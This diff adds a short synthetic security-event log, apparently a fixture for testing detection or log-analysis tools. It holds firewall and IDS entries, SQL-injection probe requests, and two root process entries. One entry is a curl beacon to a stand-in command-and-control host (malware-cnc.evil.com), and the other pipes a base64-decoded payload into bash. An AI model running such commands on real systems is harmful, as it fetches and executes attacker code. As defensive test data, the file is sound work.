@@ -1,0 +1,8 @@
+{"timestamp":"2024-01-05T08:00:00Z","source":"firewall","type":"blocked","src_ip":"192.0.2.99","dst_ip":"198.51.100.10","port":80,"proto":"TCP"}
+{"timestamp":"2024-01-05T08:01:00Z","source":"ids","type":"alert","src_ip":"203.0.113.50","dst_ip":"198.51.100.10","port":22,"proto":"TCP","signature":"SSH-brute-force"}
+{"timestamp":"2024-01-05T08:05:00Z","source":"firewall","type":"blocked","src_ip":"203.0.113.50","dst_ip":"198.51.100.10","port":22,"proto":"TCP"}
+{"timestamp":"2024-01-05T09:00:00Z","source":"webapp","type":"request","src_ip":"10.0.0.55","path":"/search?q=union+select","status":200}
+{"timestamp":"2024-01-05T09:00:05Z","source":"webapp","type":"request","src_ip":"10.0.0.55","path":"/page?id=1%20OR%201=1","status":200}
+{"timestamp":"2024-01-05T10:00:00Z","source":"system","type":"process","user":"root","command":"/usr/bin/curl http://malware-cnc.evil.com/beacon"}
+{"timestamp":"2024-01-05T12:00:00Z","source":"system","type":"process","user":"root","command":"base64 -d /tmp/payload.bin | bash"}
+{"timestamp":"2024-01-05T14:00:00Z","source":"firewall","type":"allowed","src_ip":"198.51.100.22","dst_ip":"198.51.100.10","port":443,"proto":"TCP"}
